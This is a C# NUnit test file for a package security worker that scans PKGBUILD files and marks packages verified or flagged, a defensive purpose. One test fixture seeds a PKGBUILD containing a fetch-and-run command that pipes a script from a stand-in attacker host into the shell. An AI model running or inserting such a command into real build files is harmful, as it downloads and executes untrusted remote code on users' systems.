using Atoll.Api.Services.Packages;
using Atoll.Api.Services.Security;
using Atoll.Api.Tests.Fakes;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using NUnit.Framework;

namespace Atoll.Api.Tests.Security;

public class PackageSecurityWorkerTests
{
    private static PackageSecurityWorker CreateWorker(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        bool enabled = true)
    {
        var options = Options.Create(new AtollOptions
        {
            Security = new SecurityOptions { Enabled = enabled, ScannerConcurrency = 2, PollIntervalMs = 50 }
        });
        return new PackageSecurityWorker(
            repo, securityRepo, new PkgBuildSecurityScanner(), options, NullLogger<PackageSecurityWorker>.Instance);
    }

    private static async Task SeedAsync(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        string name,
        string content)
    {
        var now = DateTimeOffset.UtcNow;
        var revision = new PackageRevisionDocument
        {
            RevisionId = "rev-1",
            CreatedAt = now,
            Author = "test",
            Message = "seed",
            Files = new Dictionary<string, PackageFile>
            {
                ["PKGBUILD"] = new() { Content = content, Size = content.Length, Hash = "h" }
            }
        };
        await repo.InsertSeedAsync(new PackageDocument
        {
            Id = name,
            PackageName = name,
            CreatedAt = now,
            UpdatedAt = now,
            HeadRevisionId = revision.RevisionId,
            Files = revision.Files,
            Revisions = [revision]
        });
        await securityRepo.MarkPendingAsync(name, revision.RevisionId);
    }

    [Test]
    public async Task Clean_package_is_marked_verified()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");

        var worker = CreateWorker(repo, securityRepo);
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "clean");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Verified));
        Assert.That(scan.RevisionId, Is.EqualTo("rev-1"));
    }

    [Test]
    public async Task Malicious_package_is_marked_flagged()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var worker = CreateWorker(repo, securityRepo);
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Flagged));
        Assert.That(scan.Findings, Is.Not.Empty);
    }

    [Test]
    public async Task Package_seeded_after_worker_start_is_picked_up_by_polling()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        var worker = CreateWorker(repo, securityRepo);
        await worker.StartAsync(CancellationToken.None);

        await SeedAsync(repo, securityRepo, "late", "pkgname=late\n");
        var scan = await WaitForScanAsync(securityRepo, "late");
        await worker.StopAsync(CancellationToken.None);

        Assert.That(scan.Status, Is.EqualTo(SecurityStatus.Verified));
    }

    [Test]
    public async Task Disabled_worker_does_not_scan()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\n");

        var worker = CreateWorker(repo, securityRepo, false);
        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(200);
        await worker.StopAsync(CancellationToken.None);

        Assert.That((await securityRepo.GetAsync("clean"))!.Status, Is.EqualTo(SecurityStatus.Pending));
    }

    private static async Task<PackageSecurityScanDocument> WaitForScanAsync(
        InMemoryPackageSecurityRepository securityRepo,
        string packageName,
        int timeoutMs = 5000)
    {
        var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
        while (DateTime.UtcNow < deadline)
        {
            var scan = await securityRepo.GetAsync(packageName);
            if (scan?.Status is SecurityStatus.Verified or SecurityStatus.Flagged or SecurityStatus.Error)
                return scan;
            await Task.Delay(20);
        }

        Assert.Fail($"Package '{packageName}' was not scanned within {timeoutMs} ms.");
        throw new InvalidOperationException("Unreachable after assertion failure.");
    }
}